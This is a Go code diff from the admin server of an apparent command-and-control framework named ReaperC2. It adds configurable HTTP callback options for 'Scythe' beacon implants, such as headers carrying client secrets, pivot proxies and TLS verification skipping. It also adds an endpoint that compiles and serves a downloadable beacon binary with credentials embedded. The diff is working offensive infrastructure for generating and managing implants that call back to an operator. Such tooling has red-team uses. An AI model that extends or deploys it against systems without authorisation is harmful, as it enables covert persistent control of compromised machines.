@@ -10,13 +10,16 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
 	"ReaperC2/pkg/dbconnections"
+	"ReaperC2/pkg/scythebuild"
 
 	"github.com/google/uuid"
 	"go.mongodb.org/mongo-driver/bson"
+	"go.mongodb.org/mongo-driver/mongo"
 )
 
 var loginPage = template.Must(template.New("login").Parse(`<!DOCTYPE html>
@@ -121,6 +124,17 @@ func (s *Server) handleLogout(w http.ResponseWriter, r *http.Request) {
 	http.Redirect(w, r, "/login", http.StatusSeeOther)
 }
 
+// scytheHTTPInput matches Scythe Http CLI flags (see ./Scythe Http -h). Empty strings use defaults in scythebuild (directories/headers generated per client).
+type scytheHTTPInput struct {
+	Method        string `json:"method"`
+	Timeout       string `json:"timeout"` // HTTP client timeout, e.g. "30s" — independent of heartbeat_interval_sec
+	Body          string `json:"body"`
+	Directories   string `json:"directories"`
+	Headers       string `json:"headers"`
+	Proxy         string `json:"proxy"`
+	SkipTLSVerify bool   `json:"skip_tls_verify"`
+}
+
 type createBeaconRequest struct {
 	ConnectionType string `json:"connection_type"`
 	ParentClientId string `json:"parent_client_id"`
@@ -131,6 +145,8 @@ type createBeaconRequest struct {
 	HeartbeatIntervalSec int `json:"heartbeat_interval_sec"`
 	// ProfileName optional; if empty, server assigns a time-based name (profile is always saved).
 	ProfileName string `json:"profile_name"`
+	// ScytheHTTP optional; HTTP timeout defaults to 30s if unset (not tied to heartbeat).
+	ScytheHTTP *scytheHTTPInput `json:"scythe_http,omitempty"`
 }
 
 type createBeaconResponse struct {
@@ -204,24 +220,36 @@ func (s *Server) handleCreateBeacon(w http.ResponseWriter, r *http.Request) {
 	if hasPivot && pivotProxy == "" {
 		pivotProxy = strings.TrimSpace(os.Getenv("BEACON_PIVOT_PROXY"))
 	}
-	scythe := buildScytheExample(base, clientID, secret, hbSec, hasPivot, pivotProxy)
+	httpOpts := scytheHTTPOptionsFromInput(req.ScytheHTTP, nil)
+	if hasPivot && strings.TrimSpace(httpOpts.Proxy) == "" && pivotProxy != "" {
+		httpOpts.Proxy = pivotProxy
+	}
+	tokens := scythebuild.BuildHTTPEmbedTokens(base, clientID, secret, httpOpts)
+	scythe := scythebuild.FormatCLIExample(tokens)
 	profileName := strings.TrimSpace(req.ProfileName)
 	if profileName == "" {
 		profileName = defaultBeaconProfileName(clientID)
 	}
 	_, profErr := dbconnections.InsertBeaconProfile(ctx, dbconnections.BeaconProfile{
-		Name:                 profileName,
-		ClientID:             clientID,
-		Secret:               secret,
-		ConnectionType:       req.ConnectionType,
-		ParentClientID:       doc.ParentClientId,
-		Label:                doc.BeaconLabel,
-		HeartbeatIntervalSec: hbSec,
-		ScytheExample:        scythe,
-		BeaconBaseURL:        base,
-		HeartbeatURL:         hURL,
-		PivotProxy:           pivotProxy,
-		CreatedBy:            user,
+		Name:                    profileName,
+		ClientID:                clientID,
+		Secret:                  secret,
+		ConnectionType:          req.ConnectionType,
+		ParentClientID:          doc.ParentClientId,
+		Label:                   doc.BeaconLabel,
+		HeartbeatIntervalSec:    hbSec,
+		ScytheHTTPMethod:        httpOpts.Method,
+		ScytheHTTPTimeout:       httpOpts.Timeout,
+		ScytheHTTPBody:          httpOpts.Body,
+		ScytheHTTPDirectories:   httpOpts.Directories,
+		ScytheHTTPHeaders:       httpOpts.Headers,
+		ScytheHTTPProxy:         httpOpts.Proxy,
+		ScytheHTTPSkipTLSVerify: httpOpts.SkipTLSVerify,
+		ScytheExample:           scythe,
+		BeaconBaseURL:           base,
+		HeartbeatURL:            hURL,
+		PivotProxy:              pivotProxy,
+		CreatedBy:               user,
 	})
 	if profErr != nil {
 		log.Printf("admin: save profile: %v", profErr)
@@ -248,14 +276,116 @@ func (s *Server) handleCreateBeacon(w http.ResponseWriter, r *http.Request) {
 	_ = json.NewEncoder(w).Encode(resp)
 }
 
-// buildScytheExample matches the Scythe CLI layout: base URL only; directories /heartbeat/<uuid> and /heartbeat; --proxy when pivoting.
-func buildScytheExample(baseURL, clientID, secret string, hbSec int, includeProxy bool, proxyHostPort string) string {
-	var proxyPart string
-	if includeProxy && strings.TrimSpace(proxyHostPort) != "" {
-		proxyPart = " --proxy " + strings.TrimSpace(proxyHostPort)
+func scytheHTTPOptionsFromInput(in *scytheHTTPInput, prof *dbconnections.BeaconProfile) scythebuild.HTTPOptions {
+	o := scythebuild.DefaultHTTPOptions()
+	if prof != nil {
+		if prof.ScytheHTTPMethod != "" {
+			o.Method = prof.ScytheHTTPMethod
+		}
+		if prof.ScytheHTTPTimeout != "" {
+			o.Timeout = prof.ScytheHTTPTimeout
+		}
+		o.Body = prof.ScytheHTTPBody
+		o.Directories = prof.ScytheHTTPDirectories
+		o.Headers = prof.ScytheHTTPHeaders
+		o.Proxy = prof.ScytheHTTPProxy
+		o.SkipTLSVerify = prof.ScytheHTTPSkipTLSVerify
 	}
-	return fmt.Sprintf(`./Scythe Http --method GET%s --timeout %ds --url %q --headers 'Content-Type:application/json,X-Client-Id:%s,X-API-Secret:%s' --directories '/heartbeat/%s,/heartbeat'`,
-		proxyPart, hbSec, baseURL, clientID, secret, clientID)
+	if in != nil {
+		if in.Method != "" {
+			o.Method = in.Method
+		}
+		if in.Timeout != "" {
+			o.Timeout = in.Timeout
+		}
+		o.Body = in.Body
+		o.Directories = in.Directories
+		o.Headers = in.Headers
+		if in.Proxy != "" {
+			o.Proxy = in.Proxy
+		}
+		o.SkipTLSVerify = in.SkipTLSVerify
+	}
+	if o.Method == "" {
+		o.Method = "GET"
+	}
+	if o.Timeout == "" {
+		o.Timeout = "30s"
+	}
+	return o
+}
+
+type scytheEmbeddedRequest struct {
+	ClientID   string           `json:"client_id"`
+	ScytheHTTP *scytheHTTPInput `json:"scythe_http,omitempty"`
+}
+
+func (s *Server) handleAPIScytheEmbedded(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if _, _, ok := s.sessionUser(r); !ok {
+		jsonError(w, http.StatusUnauthorized, "unauthorized")
+		return
+	}
+	var req scytheEmbeddedRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		jsonError(w, http.StatusBadRequest, "invalid json")
+		return
+	}
+	req.ClientID = strings.TrimSpace(req.ClientID)
+	if req.ClientID == "" {
+		jsonError(w, http.StatusBadRequest, "client_id required")
+		return
+	}
+	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Minute)
+	defer cancel()
+	doc, err := dbconnections.FindBeaconClientByID(ctx, req.ClientID)
+	if err != nil {
+		if err == mongo.ErrNoDocuments {
+			jsonError(w, http.StatusNotFound, "beacon not found")
+			return
+		}
+		log.Printf("admin: find beacon for embedded: %v", err)
+		jsonError(w, http.StatusInternalServerError, "lookup failed")
+		return
+	}
+	var prof *dbconnections.BeaconProfile
+	if p, err := dbconnections.FindBeaconProfileByClientID(ctx, req.ClientID); err == nil {
+		prof = p
+	}
+	httpOpts := scytheHTTPOptionsFromInput(req.ScytheHTTP, prof)
+	hasPivot := strings.TrimSpace(doc.ParentClientId) != ""
+	pivotProxy := ""
+	if prof != nil && strings.TrimSpace(prof.PivotProxy) != "" {
+		pivotProxy = strings.TrimSpace(prof.PivotProxy)
+	}
+	if hasPivot && strings.TrimSpace(httpOpts.Proxy) == "" {
+		if pivotProxy == "" {
+			pivotProxy = strings.TrimSpace(os.Getenv("BEACON_PIVOT_PROXY"))
+		}
+		if pivotProxy != "" {
+			httpOpts.Proxy = pivotProxy
+		}
+	}
+	base := beaconPublicBaseURL()
+	tokens := scythebuild.BuildHTTPEmbedTokens(base, doc.ClientId, doc.Secret, httpOpts)
+	bin, err := scythebuild.BuildEmbeddedBinary(ctx, tokens)
+	if err != nil {
+		log.Printf("admin: scythe embedded build: %v", err)
+		jsonError(w, http.StatusInternalServerError, "build failed: "+err.Error())
+		return
+	}
+	short := req.ClientID
+	if len(short) > 8 {
+		short = short[:8]
+	}
+	filename := fmt.Sprintf("Scythe-embedded-%s.bin", short)
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename=%q`, filename))
+	w.Header().Set("Content-Length", strconv.Itoa(len(bin)))
+	_, _ = w.Write(bin)
 }
 
 func jsonError(w http.ResponseWriter, status int, msg string) {
